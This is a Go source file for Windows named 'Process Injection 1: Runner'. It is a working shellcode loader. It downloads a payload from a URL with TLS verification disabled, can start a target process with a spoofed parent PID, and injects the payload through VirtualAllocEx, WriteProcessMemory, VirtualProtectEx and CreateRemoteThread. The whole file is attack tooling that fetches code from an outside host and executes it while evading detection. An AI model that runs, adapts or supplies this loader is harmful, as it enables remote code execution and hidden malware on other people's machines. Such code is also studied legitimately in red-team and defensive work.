package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	"github.com/alexflint/go-arg"
	"golang.org/x/sync/errgroup"
	"golang.org/x/sys/windows"
)

type args struct {
	Url    string `arg:"-u,required"`
	Target string `arg:"-t"`
	Parent uint   `arg:"-p"`
	Kill   bool   `arg:"-k"`
}

func banner() string {
	return "Process Injection 1: Runner (Win32 API)\n"
}

func (args) Description() string {
	return banner()
}

func spawnProcess(target string, parent uint) *windows.ProcessInformation {
	pi := new(windows.ProcessInformation)
	cmdline, _ := syscall.UTF16PtrFromString(target)
	if parent > 0 {
		si := new(windows.StartupInfoEx)
		si.Cb = uint32(unsafe.Sizeof(*si))
		hParent, err := windows.OpenProcess(windows.MAXIMUM_ALLOWED, false, uint32(parent))
		if err != nil {
			fmt.Printf("[!] OpenProcess: %s", err.Error())
			os.Exit(1)
		}
		pta, err := windows.NewProcThreadAttributeList(1)
		if err != nil {
			fmt.Printf("[!] NewProcThreadAttributeList: %s", err.Error())
			os.Exit(1)
		}
		pta.Update(windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, unsafe.Pointer(&hParent), unsafe.Sizeof(hParent))
		si.ProcThreadAttributeList = pta.List()
		err = windows.CreateProcess(nil, cmdline, nil, nil, false, windows.EXTENDED_STARTUPINFO_PRESENT, nil, nil, &si.StartupInfo, pi)
		if err != nil {
			fmt.Printf("[!] CreateProcess: %s", err.Error())
		}
	} else {
		si := new(windows.StartupInfo)
		err := windows.CreateProcess(nil, cmdline, nil, nil, false, 0, nil, nil, si, pi)
		if err != nil {
			fmt.Printf("[!] CreateProcess: %s", err.Error())
		}
	}
	return pi
}

func fetch(url string, rc chan *http.Response) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Get(url)
	if err == nil {
		if resp.StatusCode >= 400 {
			fmt.Printf("[!] Unable to fetch payload: %s", resp.Status)
			os.Exit(1)
		}
		rc <- resp
	}
	return err
}

func display(url, target string, parent uint, kill bool) {
	fmt.Printf("[*] Payload: %s\n", url)
	if target == "" {
		fmt.Println("[*] Target: Self-injection")
	} else {
		fmt.Printf("[*] Target: %s\n", target)
	}
	fmt.Printf("[*] PPID Spoofing: %d\n", parent)
	fmt.Printf("[*] Kill: %t\n", kill)
}

func main() {
	var opts args
	arg.MustParse(&opts)
	fmt.Println(banner())
	display(opts.Url, opts.Target, opts.Parent, opts.Kill)

	rc := make(chan *http.Response, 1)
	errGrp, _ := errgroup.WithContext(context.Background())

	fmt.Println("[+] Fetching payload")
	errGrp.Go(func() error { return fetch(opts.Url, rc) })

	hTarget := windows.CurrentProcess()
	if opts.Target != "" {
		fmt.Println("[+] CreateProcess")
		pi := spawnProcess(opts.Target, opts.Parent)
		hTarget = pi.Process
		fmt.Printf("    PID: %d\n", pi.ProcessId)
	}

	fmt.Println("[+] Waiting for payload to finish downloading")
	err := errGrp.Wait()
	if err != nil {
		fmt.Printf("Unable to fetch payload: %s", err.Error())
		os.Exit(1)
	}
	scResp := <-rc
	defer scResp.Body.Close()
	sc, _ := io.ReadAll(scResp.Body)
	fmt.Println("    Done")

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	fmt.Println("[+] VirtualAllocEx")
	baseAddress, _, err := VirtualAllocEx.Call(uintptr(hTarget), 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if baseAddress == 0 {
		fmt.Printf("[!] VirtualAllocEx: %s", err.Error())
		os.Exit(1)
	}
	fmt.Printf("    Address: %#x (PAGE_READWRITE)\n", baseAddress)

	var nbytes uintptr
	fmt.Println("[+] WriteProcessMemory")
	if err := windows.WriteProcessMemory(hTarget, baseAddress, &sc[0], uintptr(len(sc)), &nbytes); err != nil {
		fmt.Printf("[!] WriteProcessMemory: %s", err.Error())
		os.Exit(1)
	}
	fmt.Println("    Shellcode injected")

	var oldProtect uint32
	fmt.Println("[+] VirtualProtectEx")
	if err := windows.VirtualProtectEx(hTarget, baseAddress, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		fmt.Printf("[!] VirtualProtectEx: %s", err.Error())
		os.Exit(1)
	}
	fmt.Println("    Protection changed to PAGE_EXECUTE_READ")

	CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
	var threadId uint
	fmt.Println("[+] CreateRemoteThread")
	hThread, _, _ := CreateRemoteThread.Call(uintptr(hTarget), 0, 0, baseAddress, 0, 0, (uintptr)(unsafe.Pointer(&threadId)))
	fmt.Println("    Executing shellcode")

	if opts.Target == "" {
		fmt.Println("[+] WaitFoSingleObject")
		fmt.Println("    Keeping process alive")
		windows.WaitForSingleObject(windows.Handle(hThread), 0xffffffff)
	}

	fmt.Println("[+] Closing handle")
	if hThread != 0 {
		windows.CloseHandle(windows.Handle(hThread))
	}
	fmt.Println("    Closed thread handle")
	if hTarget != 0 {
		windows.CloseHandle(hTarget)
	}
	fmt.Println("    Closed process handle")
}
